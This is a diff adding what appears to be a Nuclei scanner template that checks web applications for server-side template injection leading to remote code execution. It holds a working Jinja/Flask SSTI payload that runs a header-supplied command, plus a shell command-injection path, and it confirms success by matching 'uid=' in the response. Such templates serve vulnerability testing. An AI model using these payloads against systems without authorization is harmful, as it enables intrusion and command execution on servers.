@@ -1,0 +1,30 @@
+id: ssti-to-rce-id-semicolon
+
+info:
+  name: SSTI to RCE
+  author: reewardius
+  severity: critical
+  reference: https://infosecwriteups.com/ssti-bypassing-single-quotes-filter-dc0ee4e4f011
+  tags: rce,generic
+  
+http:
+  - raw:
+      - |
+        GET /{{url_for.__globals__.os.popen(request.headers.rce).read()}} HTTP/1.1
+        Host: {{Hostname}}
+        RCE: ; id
+        Content-Type: application/x-www-form-urlencoded
+        
+      - |
+        GET /%26ls||id%26 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
